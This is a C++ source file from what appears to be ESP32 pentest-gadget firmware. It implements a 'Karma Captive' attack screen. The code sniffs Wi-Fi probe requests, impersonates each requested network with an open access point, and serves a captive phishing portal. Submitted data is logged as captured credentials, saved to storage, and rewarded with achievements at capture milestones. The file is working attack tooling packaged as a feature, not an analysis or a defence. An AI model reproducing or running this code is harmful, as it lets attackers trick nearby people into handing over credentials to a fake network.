#include "WifiKarmaCaptiveScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputNumberAction.h"
#include "utils/StorageUtil.h"

#include <WiFi.h>
#include <esp_system.h>

WifiKarmaCaptiveScreen* WifiKarmaCaptiveScreen::_instance = nullptr;

// ── Destructor ───────────────────────────────────────────────────────────────

WifiKarmaCaptiveScreen::~WifiKarmaCaptiveScreen()
{
  _stopAttack();
  _instance = nullptr;
}

// ── Callbacks ────────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::_onVisit(void* ctx)
{
  auto* self = static_cast<WifiKarmaCaptiveScreen*>(ctx);
  self->_log.addLine("[+] Portal visited");
}

void WifiKarmaCaptiveScreen::_onPost(const String& data, void* ctx)
{
  auto* self = static_cast<WifiKarmaCaptiveScreen*>(ctx);
  self->_log.addLine("[+] Credential captured!", TFT_GREEN);

  int nc = Achievement.inc("wifi_karma_captive_captured");
  if (nc == 1)  Achievement.unlock("wifi_karma_captive_captured");
  if (nc == 10) Achievement.unlock("wifi_karma_captive_10");
  if (nc == 25) Achievement.unlock("wifi_karma_captive_25");
  if (nc == 50) Achievement.unlock("wifi_karma_captive_50");

  String ssid = (self->_currentSsid[0] != '\0') ? String(self->_currentSsid) : "unknown";
  self->_portal.saveCaptured(data, "karma_" + ssid);
  self->_inputStartTime = millis();
}

// ── Lifecycle ────────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::onInit()
{
  _instance = this;
  _showMenu();
}

void WifiKarmaCaptiveScreen::onItemSelected(uint8_t index)
{
  if (_state != STATE_MENU) return;
  switch (index) {
    case 0: { // Save WiFi List
      _saveList = !_saveList;
      _saveListSub = _saveList ? "On" : "Off";
      _menuItems[0].sublabel = _saveListSub.c_str();
      render();
      break;
    }
    case 1: { // Captive Portal selection
      _state = STATE_SELECT_PORTAL;
      if (_portal.selectPortal()) {
        _showMenu();
      } else {
        _state = STATE_MENU;
        render();
      }
      break;
    }
    case 2: { // Waiting Time
      int val = InputNumberAction::popup("Wait Connect (s)", 5, 120, _waitConnect);
      if (val >= 5) _waitConnect = val;
      _showMenu();
      break;
    }
    case 3: { // Wait Input
      int val = InputNumberAction::popup("Captive Wait Input (s)", 10, 600, _waitInput);
      if (val >= 10) _waitInput = val;
      _showMenu();
      break;
    }
    case 4: { // Start
      _startAttack();
      break;
    }
  }
}

void WifiKarmaCaptiveScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  // ── Handle exit ───────────────────────────────────────────────────────────
  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopAttack();
      _showMenu();
      return;
    }
  }

  // ── DNS processing ────────────────────────────────────────────────────────
  _portal.processDns();

  unsigned long now = millis();

  // ── AP active logic ───────────────────────────────────────────────────────
  if (_apActive) {
    int clients = WiFi.softAPgetStationNum();
    if (clients > 0 && !_clientConnected) {
      _clientConnected = true;
      _inputStartTime = now;
      char buf[60];
      snprintf(buf, sizeof(buf), "[+] Client connected to: %s", _currentSsid);
      _log.addLine(buf, TFT_GREEN);
    }
    if (!_clientConnected) {
      if (now - _apStartTime > (unsigned long)_waitConnect * 1000) {
        char buf[60];
        snprintf(buf, sizeof(buf), "[-] Timeout: %s", _currentSsid);
        _log.addLine(buf);
        _blacklistSSID(_currentSsid);
        _teardownAP();
      }
    } else {
      if (now - _inputStartTime > (unsigned long)_waitInput * 1000) {
        char buf[60];
        snprintf(buf, sizeof(buf), "[-] Input timeout: %s", _currentSsid);
        _log.addLine(buf);
        _blacklistSSID(_currentSsid);
        _teardownAP();
      }
    }
  }

  // ── Deploy next queued SSID ───────────────────────────────────────────────
  if (!_apActive) {
    while (_queueHead != _queueTail) {
      int head = _queueHead;
      _queueHead = (_queueHead + 1) % MAX_SSIDS;
      if (!_isBlacklisted(_probeQueue[head])) {
        _deployAP(_probeQueue[head], now);
        break;
      }
    }
  }

  // ── Redraw ────────────────────────────────────────────────────────────────
  if (now - _lastDraw > 500) {
    render();
    _lastDraw = now;
  }
}

void WifiKarmaCaptiveScreen::onRender()
{
  if (_state == STATE_RUNNING) { _drawLog(); return; }
  ListScreen::onRender();
}

void WifiKarmaCaptiveScreen::onBack()
{
  if (_state == STATE_SELECT_PORTAL) {
    _showMenu();
  } else if (_state == STATE_RUNNING) {
    _stopAttack();
    _showMenu();
  } else {
    Screen.goBack();
  }
}

// ── Menu ─────────────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::_showMenu()
{
  _state          = STATE_MENU;
  _saveListSub    = _saveList ? "On" : "Off";
  _portalSub      = _portal.portalFolder().isEmpty() ? "-" : _portal.portalFolder();
  _waitConnectSub = String(_waitConnect) + "s";
  _waitInputSub   = String(_waitInput) + "s";

  _menuItems[0] = {"Save WiFi List", _saveListSub.c_str()};
  _menuItems[1] = {"Captive Portal", _portalSub.c_str()};
  _menuItems[2] = {"Waiting Time",   _waitConnectSub.c_str()};
  _menuItems[3] = {"Wait Input",     _waitInputSub.c_str()};
  _menuItems[4] = {"Start"};
  setItems(_menuItems, 5);
}

// ── Probe Sniffer ────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (!_instance) return;
  if (type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  const uint16_t len   = (uint16_t)pkt->rx_ctrl.sig_len;

  if (len < 28) return;
  if (frame[0] != 0x40) return;  // probe request subtype

  uint8_t ssidLen = frame[25];
  if (ssidLen < 1 || ssidLen > 32) return;

  char ssid[33];
  memcpy(ssid, &frame[26], ssidLen);
  ssid[ssidLen] = '\0';

  bool allSpace = true;
  for (int i = 0; i < ssidLen; i++) {
    if (ssid[i] != ' ') { allSpace = false; break; }
  }
  if (allSpace) return;

  _instance->_onProbe(ssid);
}

void WifiKarmaCaptiveScreen::_onProbe(const char* ssid)
{
  if (_isBlacklisted(ssid)) return;

  for (int i = _queueHead; i != _queueTail; i = (i + 1) % MAX_SSIDS) {
    if (strcmp(_probeQueue[i], ssid) == 0) return;
  }
  if (_apActive && strcmp(_currentSsid, ssid) == 0) return;

  int nextTail = (_queueTail + 1) % MAX_SSIDS;
  if (nextTail == _queueHead) return;

  strncpy(_probeQueue[_queueTail], ssid, 32);
  _probeQueue[_queueTail][32] = '\0';
  _queueTail = nextTail;
  _capturedCount++;

  char buf[60];
  snprintf(buf, sizeof(buf), "[*] Probe: %s", ssid);
  _log.addLine(buf);

  if (_saveList) _saveSSIDToFile(ssid);
}

void WifiKarmaCaptiveScreen::_startSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(200);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);

  _log.addLine("[*] Sniffing probes...");
}

void WifiKarmaCaptiveScreen::_stopSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

// ── AP Deployment ────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::_deployAP(const char* ssid, unsigned long now)
{
  strncpy(_currentSsid, ssid, 32);
  _currentSsid[32] = '\0';

  _stopSniffing();
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, NULL, 1, 0, 4);
  delay(100);
  IPAddress apIP = WiFi.softAPIP();
  if (!_portal.server()) _portal.start(apIP);

  _apActive        = true;
  _apStartTime     = now;
  _clientConnected = false;

  char buf[60];
  snprintf(buf, sizeof(buf), "[>] AP: %.20s (%ds)", ssid, _waitConnect);
  _log.addLine(buf);
}

void WifiKarmaCaptiveScreen::_teardownAP()
{
  _portal.stop();
  WiFi.softAPdisconnect(true);
  _startSniffing();
  _apActive        = false;
  _clientConnected = false;
}

// ── Start / Stop ─────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::_startAttack()
{
  if (_portal.portalFolder().isEmpty()) {
    ShowStatusAction::show("Select a portal first!");
    return;
  }
  if (!StorageUtil::hasSpace()) {
    ShowStatusAction::show("Storage full! (<20KB free)");
    return;
  }

  _state = STATE_RUNNING;
  _log.clear();
  _queueHead      = 0;
  _queueTail      = 0;
  memset(_currentSsid, 0, sizeof(_currentSsid));
  _blacklistCount = 0;
  _capturedCount  = 0;
  _apActive       = false;
  _lastDraw       = 0;

  _portal.setCallbacks(_onVisit, _onPost, this);
  _portal.loadPortalHtml();
  if (_portal.portalHtml().isEmpty()) {
    ShowStatusAction::show("Portal HTML not found!");
    _state = STATE_MENU;
    return;
  }

  int nk = Achievement.inc("wifi_karma_captive_started");
  if (nk == 1) Achievement.unlock("wifi_karma_captive_started");

  _log.addLine("[*] Karma Captive started");
  _log.addLine("[*] BACK/Press to stop");
  _startSniffing();
  _drawLog();
}

void WifiKarmaCaptiveScreen::_stopAttack()
{
  _stopSniffing();
  _portal.reset();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  _apActive        = false;
  _clientConnected = false;
  _queueHead       = 0;
  _queueTail       = 0;
  _blacklistCount  = 0;
}

// ── Save to file ─────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::_saveSSIDToFile(const char* ssid)
{
  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
  if (!StorageUtil::hasSpace()) {
    _log.addLine("[!] Storage full, skip save", TFT_RED);
    return;
  }

  Uni.Storage->makeDir("/unigeek/wifi/captives");
  String path = "/unigeek/wifi/captives/karma_ssid.txt";

  char line[80];
  struct tm timeinfo;
  if (getLocalTime(&timeinfo, 0)) {
    char ts[20];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &timeinfo);
    snprintf(line, sizeof(line), "%s:%s", ts, ssid);
  } else {
    snprintf(line, sizeof(line), "%lu:%s", millis() / 1000, ssid);
  }

  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND);
  if (f) {
    f.println(line);
    f.close();
  }
}

// ── Blacklist ────────────────────────────────────────────────────────────────

bool WifiKarmaCaptiveScreen::_isBlacklisted(const char* ssid)
{
  for (int i = 0; i < _blacklistCount; i++) {
    if (strcmp(_blacklist[i], ssid) == 0) return true;
  }
  return false;
}

void WifiKarmaCaptiveScreen::_blacklistSSID(const char* ssid)
{
  if (_blacklistCount >= MAX_SSIDS) return;
  strncpy(_blacklist[_blacklistCount], ssid, 32);
  _blacklist[_blacklistCount][32] = '\0';
  _blacklistCount++;
}

// ── Log Display ──────────────────────────────────────────────────────────────

void WifiKarmaCaptiveScreen::_drawLog()
{
  auto* self = this;
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](Sprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<WifiKarmaCaptiveScreen*>(ud);
      sp.setTextColor(TFT_GREEN, TFT_BLACK);
      sp.setTextDatum(TL_DATUM);
      char stats[40];
      snprintf(stats, sizeof(stats), "AP:%d V:%d P:%d",
               s->_capturedCount, s->_portal.visitCount(), s->_portal.postCount());
      sp.drawString(stats, 2, barY);
      sp.setTextDatum(TR_DATUM);
      if (s->_apActive && s->_currentSsid[0] != '\0') {
        sp.drawString(String(s->_currentSsid).substring(0, 14), w - 2, barY);
      } else {
        sp.drawString("Sniffing...", w - 2, barY);
      }
    }, self);
}